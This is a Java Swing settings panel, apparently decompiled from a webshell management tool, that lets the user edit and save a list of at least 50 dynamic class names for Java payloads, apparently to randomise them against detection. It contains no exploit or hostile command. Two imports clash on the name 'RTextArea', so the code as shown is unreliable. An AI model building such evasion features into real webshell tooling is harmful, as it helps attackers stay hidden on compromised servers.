package shells.payloads.java;

import core.Db;
import core.ui.component.RTextArea;
import core.ui.component.dialog.AppSeting;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import java.util.Arrays;
import java.util.HashSet;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JSplitPane;
import org.fife.ui.rtextarea.RTextArea;
import org.fife.ui.rtextarea.RTextScrollPane;
import util.Log;
import util.automaticBindClick;
import util.functions;

public class DynamicUpdateClass extends JPanel {
  static {
    AppSeting.registerPluginSeting("Java动态Class名字", DynamicUpdateClass.class);
  }

  
  public static final String ENVNAME = "DynamicClassNames";
  private final RTextArea classNameTextArea;
  private final JButton updateHeaderButton;
  
  public DynamicUpdateClass() {
    super(new BorderLayout(1, 1));
    this.classNameTextArea = new RTextArea();
    this.updateHeaderButton = new JButton("修改");
    this.classNameTextArea.setText(Db.getSetingValue("DynamicClassNames", readDefaultClassName()));
    Dimension dimension = new Dimension();
    dimension.height = 30;
    JSplitPane splitPane = new JSplitPane();
    splitPane.setOrientation(0);
    JPanel bottomPanel = new JPanel();
    splitPane.setTopComponent((Component)new RTextScrollPane((RTextArea)this.classNameTextArea, true));
    bottomPanel.add(this.updateHeaderButton);
    bottomPanel.setMaximumSize(dimension);
    bottomPanel.setMinimumSize(dimension);
    splitPane.setBottomComponent(bottomPanel);
    
    splitPane.setResizeWeight(0.9D);
    
    automaticBindClick.bindJButtonClick(this, this);
    
    add(splitPane);
  }

  
  private static String readDefaultClassName() {
    byte[] data = null;
    try {
      InputStream fileInputStream = DynamicUpdateClass.class.getResourceAsStream("assets/classNames.txt");
      data = functions.readInputStream(fileInputStream);
      fileInputStream.close();
    } catch (Exception e) {
      Log.error(e);
    } 
    return new String(data);
  }
  
  public static HashSet getAllDynamicClassName() {
    String classNameString = Db.getSetingValue("DynamicClassNames", readDefaultClassName());
    String[] classNames = classNameString.split("\n");
    HashSet<String> classNameSet = new HashSet<>();
    Arrays.<String>stream(classNames).forEach(name -> {
          if (name.trim().length() > 0) {
            classNameSet.add(name.trim());
          }
        });
    return classNameSet;
  }
  
  private void updateHeaderButtonClick(ActionEvent actionEvent) {
    String classNameString = this.classNameTextArea.getText();
    String[] classNames = classNameString.split("\n");
    HashSet<String> classNameSet = new HashSet<>();
    Arrays.<String>stream(classNames).forEach(name -> {
          if (name.trim().length() > 0) {
            classNameSet.add(name.trim());
          }
        });
    if (classNameSet.size() > 50) {
      Db.updateSetingKV("DynamicClassNames", classNameString);
      GOptionPane.showMessageDialog(null, "修改成功", "提示", 1);
    } else {
      GOptionPane.showMessageDialog(null, "ClassName 少于50个", "错误提示", 1);
    } 
  }
}
